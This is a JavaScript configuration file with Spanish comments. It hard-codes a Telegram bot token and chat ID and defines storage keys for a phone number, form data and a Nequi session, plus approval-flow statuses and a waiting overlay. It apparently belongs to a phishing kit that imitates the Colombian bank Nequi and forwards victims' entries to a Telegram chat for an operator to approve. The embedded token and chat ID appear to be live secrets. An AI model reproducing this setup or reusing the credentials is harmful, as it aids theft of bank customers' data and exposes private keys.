/**
 * ===========================================
 * CONFIGURACIÓN CENTRALIZADA DE LA APLICACIÓN
 * ===========================================
 * Todas las constantes y configuraciones globales
 * @module Config
 * @version 2.0.0
 * ===========================================
 */

const AppConfig = {
  // ========================================
  // TELEGRAM BOT CONFIGURATION
  // ========================================
  telegram: {
    botToken: '8575415701:AAHrkYg4wE00cWvhvJzfdICS3kjsgomvUcc',
    chatId: '-5179068892',
    apiUrl: 'https://api.telegram.org/bot',
  },

  // ========================================
  // OVERLAY CONFIGURATION
  // ========================================
  overlay: {
    defaultTimeout: 30000, // 30 segundos
    messages: {
      loading: 'Procesando...',
      waiting: 'Esperando confirmación...',
      error: 'Ha ocurrido un error',
      success: '¡Éxito!',
    },
  },

  // ========================================
  // LOCAL STORAGE KEYS
  // ========================================
  storageKeys: {
    phoneNumber: 'numero',
    formData: 'formData',
    sessionId: 'nequi_session_id', // Cambiado para consistencia
    userFlow: 'userFlow',
  },

  // ========================================
  // FLOW STATUS
  // ========================================
  flowStatus: {
    PENDING: 'pending',
    APPROVED: 'approved',
    REJECTED: 'rejected',
    WAITING: 'waiting',
  },
};

// ========================================
// INICIALIZACIÓN AUTOMÁTICA
// ========================================
// Generar Session ID único si no existe
if (typeof window !== 'undefined' && !localStorage.getItem('nequi_session_id')) {
  const sessionId = `S${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
  localStorage.setItem('nequi_session_id', sessionId);
  console.log('🆕 Session ID generado:', sessionId);
}

// ========================================
// EXPORTAR PARA USO MODULAR
// ========================================
if (typeof module !== 'undefined' && module.exports) {
  module.exports = AppConfig;
}
